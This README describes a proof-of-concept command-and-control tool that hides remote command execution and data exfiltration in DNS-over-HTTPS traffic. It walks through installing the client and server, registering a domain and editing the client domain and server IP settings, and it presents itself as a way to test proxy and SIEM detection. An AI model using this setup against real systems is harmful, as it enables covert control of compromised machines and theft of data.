# Dns-over-HTTPS-DOH
This project provides a proof-of-concept implementation of a Command and Control (C2) infrastructure using DNS over HTTPS (DoH). 
DoH C2 allows for covert communication between the C2 server and the infected client machines by leveraging encrypted DNS queries
thereby making the traffic appear legitimate and harder to detect by traditional network monitoring tools.

# Testing and Limitations
This project is intended for educational purposes and authorized security research only. 
Bypassing antivirus software or other security measures is not within the scope of this project. 
It is designed for testing in controlled environments to demonstrate the feasibility and mechanics of using DoH for C2 communication **to test enterprise corporate forward proxy detection and improve any custom build signatures in SIEMs.**

# Features
**Covert Communication**: Utilizes DoH to encode and disguise C2 traffic.

**Command Execution**: Supports remote execution of commands on infected Linux clients.

**Data Exfiltration**: Allows for exfiltration of data through DOH queries.

**Server and Client Implementation**: Includes both C2 server and client components.

# Initial setup
For client side, linux is recommended but the code was tested on Windows 10 and seem to worked :)
For server side linux

1. **Client Side**
   Python:
        Install Python 3.x from the official website or your package manager.
    Requests Library:
       Install the requests library using pip:
       pip install requests
3. **Server side** only Linux
    Dnslib Library:
    Install the dnslib library using pip
   
    pip install dnslib


4. Register domain 
Example purchasing domain using namecheap.com
![grafik](https://github.com/user-attachments/assets/adb40d21-4985-465c-864f-a286b49a2bc1)
Follow instructions on the screenshot bellow to setup the NameServer.
Replace the IP and domainname with your purchased domain
![grafik](https://github.com/user-attachments/assets/c9e9f4cf-ac77-4b31-b92d-7bfe28ed93e9)

# Usage
**1. Client side**  

Make sure to change the bellow in the "doh_client.py" to the domain registered in step 4  

if __name__ == "__main__":
    domain_name = "send.example.com"  # Replace after '**send**' with your domain
    execute_command_from_dns(domain_name)

      
python3 doh_client.py  
Example run
![grafik](https://github.com/user-attachments/assets/3e2a5718-88fd-4a66-a48d-d129c276fbdf)



**2. Server side**  

Make sure to change the IP in the "doh_server.py"  

class DNSDoHServer:
    def __init__(self, host='YOURIP', port=53): # Replace with Your public IP


Example run:
![grafik](https://github.com/user-attachments/assets/44bde720-9619-44ed-ac1c-47f34b54e5ca)

Note instaead of the  example.com.co you should see your domain name
Run: python3 doh_server.py

# Architecture TODO
# Detection Tips TODO
